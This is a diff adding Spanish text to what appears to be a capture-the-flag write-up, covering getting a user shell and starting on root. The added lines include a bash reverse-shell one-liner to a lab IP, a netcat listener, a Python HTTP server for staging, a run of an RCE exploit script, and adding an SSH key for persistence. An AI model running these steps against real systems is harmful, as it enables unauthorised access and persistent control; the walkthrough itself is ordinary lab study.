@@ -427,10 +427,25 @@ response = read_socket(socket_id)
 
 </code></pre>
 
+<h1>User</h1>
+<p>Siga el mismo procedimiento a continuación..</p>  
+<p>Prepare el shell inverso -> bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1. Guárdelo como payload.py.</p>  
+<p>Ejecute el servidor HTTP de Python -> python3 -m http.server 8000..</p>  
+<p>Ejecute el oyente -> nc -nlvp 4444..</p> 
+<p>Ejecute el archivo de explotación desde el repositorio -> python3 RCE.py — destino https://10.10.x.x -i 127.0.0.1 -p 40056.</p> 
+<p>Cuando la sesión queda atrapada en el lado del oyente, podemos ver que hemos ingresado exitosamente al puerto ssh del usuario ilya. .</p> 
 
 
+<h1>Bandera ROOT</h1>
+<p>El shell SSH de ilya actual se cerrará repetidamente después de unos minutos..</p> 
+<p> Este problema se puede resolver agregando nuestra clave pública SSH al puerto SSH de Ilya, lo que nos permitirá usar el puerto SSH de Ilya en nuestro sistema</p> 
 
-<p>.</p>  
+<pre><code>
+ssh-keygen
+</code></pre>
+
+<p> .</p> 
+<p> .</p> 
 
 </body>
 </html>
